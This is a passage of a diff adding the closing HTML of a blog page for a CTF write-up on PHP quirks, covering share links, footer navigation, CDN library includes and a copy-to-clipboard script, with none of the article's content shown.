+  <li><a class="icon" href="mailto:?subject=ctfshow--php特性篇&body=Check out this article: http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&name=ctfshow--php特性篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&t=ctfshow--php特性篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
